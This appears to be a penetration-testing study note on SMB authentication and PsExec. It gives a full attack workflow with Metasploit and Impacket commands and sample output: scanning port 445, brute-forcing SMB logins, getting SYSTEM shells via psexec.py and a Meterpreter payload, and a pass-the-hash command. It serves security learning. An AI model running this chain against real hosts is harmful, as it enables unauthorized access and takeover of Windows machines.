# SMB Authentication & PsExec ‚Äì Explained

## SMB Authentication

- **Two layers**:
  1. **User Auth**: Username + password/hash ‚Üí authenticate to the **machine**
  2. **Share Auth**: (Optional) Additional password to access a specific **share**
- Both use **challenge-response** (NTLM/Kerberos) ‚Äî no plaintext passwords sent.

---
## What Is PsExec?

- **Microsoft utility** to run commands on remote Windows systems via **SMB**.
- **No GUI** ‚Äî just command-line (`cmd.exe`).
- **Authentication**: Uses SMB ‚Üí supports **passwords or NTLM hashes (Pass-the-Hash)**.

> ‚úÖ Like RDP, but **text-only** and **scriptable**.

---
## Workflow: From Creds to Shell

### Step 1: Find SMB & Brute-Force

```bash
nmap -p 445 192.168.1.10
```

#### Brute-Force with Metasploit

```msf
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.10
set USER_FILE /path/users.txt
set PASS_FILE /path/passes.txt
set VERBOSE false   # Only show successes
run
```

‚Üí Output: `[+] 192.168.1.10:445 - Success: '.\Administrator:qwertyuiop'`

---
### Step 2: Use Valid Creds

#### Option A: `psexec.py` (Impacket ‚Äì Clean, No File Drop)

```bash
psexec.py Administrator:qwertyuiop@192.168.1.10 cmd.exe
```

- **What it does**:  
  ‚Üí Authenticates via SMB  
  ‚Üí Spawns `cmd.exe` **in-memory** (no file written to disk)  
  ‚Üí Gives **interactive shell**

> ‚ùì **Is this a reverse shell?**  
> ‚Üí **No** ‚Äî it‚Äôs a **direct bind shell** over SMB.  
> ‚Üí You‚Äôre connected **live**, like SSH ‚Äî not a callback like Meterpreter.

‚úÖ Output:

```
C:\Windows\system32> whoami
nt authority\system
```

> üí° **Why `.py`?**  
> - Original `PsExec.exe` is Windows-only  
> - `psexec.py` (from **Impacket**) runs on **Linux/Kali**

---
#### Option B: Metasploit `psexec` Exploit (Drops Payload)

```msf
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
```

- **What it does**:  
  ‚Üí Uploads a **malicious service executable** to `C:\Windows\Temp`  
  ‚Üí Runs it ‚Üí gives **Meterpreter reverse shell**  
  ‚Üí Deletes service (but file may remain)

> ‚ö†Ô∏è **More detectable** ‚Äî writes files, creates services.

‚úÖ Output:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---
## Key Differences

| Method | Shell Type | File Dropped? | Stealth | Use Case |
|-------|-----------|--------------|--------|--------|
| **`psexec.py`** | Direct CMD shell | ‚ùå No | ‚úÖ High | Quick command execution, clean |
| **MSF `psexec`** | Meterpreter reverse shell | ‚úÖ Yes | ‚ùå Lower | Full post-exploitation (migrate, keylog, etc.) |

---
## Final Notes

- Both give **SYSTEM-level access** if using local admin creds.
- **`psexec.py` = stealthy, instant shell**  
- **MSF `psexec` = full Meterpreter features** (but noisier)
- Always prefer **Pass-the-Hash** when possible:  
  ```bash
  psexec.py -hashes :<NTLM_HASH> Administrator@192.168.1.10
  ```

> üî• PsExec = **legitimate admin tool turned offensive weapon**.

